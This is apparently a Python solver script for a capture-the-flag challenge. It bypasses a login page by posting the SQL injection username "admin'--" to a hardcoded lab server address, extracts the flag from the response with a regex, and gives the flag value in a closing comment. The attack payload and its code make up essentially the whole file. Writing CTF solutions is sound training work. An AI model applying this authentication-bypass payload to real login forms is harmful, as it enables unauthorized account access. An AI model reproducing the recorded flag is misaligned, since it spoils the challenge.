import requests
import re
"""
    in this challenge we had a simple login page ever the 'fogot password' feature isn't implemented
    so the first thing to test is ofc SQL injection

"""

base_url="http://68.219.177.187:8004/login"

# the query is at most likely : SELECT * FROM users WHERE username=user AND password=pass; (where user and passs are the inputs)

data={
    "username": "admin'--",
    "password": "anything"
}

r=requests.post(base_url,data=data,allow_redirects=True)

#Extracting the flag from the response we know flag format is SecurinetsEnit{...}

flag_match = re.search(r'SecurinetsEnit\{.*?\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"[+] Flag: {flag}")
else:
    print("[-] Flag not found in response")
    
    
#The flag:SecurinetsEnit{b5a1cfc34b9f1b0a5c8e6a7c3b9d1e2a}